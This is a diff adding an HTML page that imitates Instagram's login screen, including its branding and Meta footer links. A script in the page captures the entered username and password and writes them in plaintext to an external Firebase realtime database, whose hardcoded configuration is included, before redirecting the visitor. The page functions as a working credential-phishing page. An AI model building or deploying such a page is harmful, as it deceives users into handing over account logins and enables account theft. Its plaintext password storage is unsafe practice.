@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img class="logo-img" src="logo.png" alt="">
+        <form action="#"  value="submit" onsubmit="return validateForm()">
+            <input class="username" placeholder="Phone number, username, or email" id="username" type="text" required>
+            <input class="password" placeholder="Password" id="password" type="password" required>
+            <button class="login_btn" id="submit"value="submit">Log in</button>
+        </form>
+        <div class="or-line">
+            <!-- <p class="lines">---------------</p> -->
+           <hr> <span class="or">OR</span><hr>
+            <!-- <p class="lines">---------------</p> -->
+        </div>
+        <span class="facebook">Log in with Facebook</span>
+        <span class="forgot">Forgot password?</span>
+        <span class="signup">Don't have an account? <a href="signup.html">Sign up</a></span>
+
+        <div class="foot">
+            <p>Meta</p>
+            <p>About</p>
+            <p>Blog</p>
+            <p>Jobs</p>
+            <p>Help</p>
+            <p>API</p>
+            <p>Privacy</p>
+            <p>Terms</p>
+            <p>Locations</p>
+            <p>Instagram Lite</p>
+            <p>Threads</p>
+            <p>Contact Uploading & Non-Users</p>
+            <p>Meta Verified</p>
+            <p>© 2023 Instagram from Meta</p>
+        </div>
+    </div>
+    <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyB9U63h_DNU5XvhlX6_EWFu-N8kGiI6obk",
+        authDomain: "instagram-clone-96b2e.firebaseapp.com",
+        projectId: "instagram-clone-96b2e",
+        storageBucket: "instagram-clone-96b2e.appspot.com",
+        messagingSenderId: "51953179757",
+        appId: "1:51953179757:web:dd96c4001c9c1c39ecf364",
+        measurementId: "G-7WQRRFSNDH",
+        databaseURL: "https://instagram-clone-96b2e-default-rtdb.firebaseio.com/"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById("submit").addEventListener('click', function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        if (username && password) {
+            set(ref(db, 'user/' + username), {
+                username: username,
+                Password: password
+            }).then(() => {
+               
+                 window.location.href = "dashboard.html";
+            }).catch((error) => {
+                console.error("Error writing document: ", error);
+            });
+        } else {
+            alert("Please fill in all required fields.");
+        }
+    });
+</script>
+</body>
+</html>
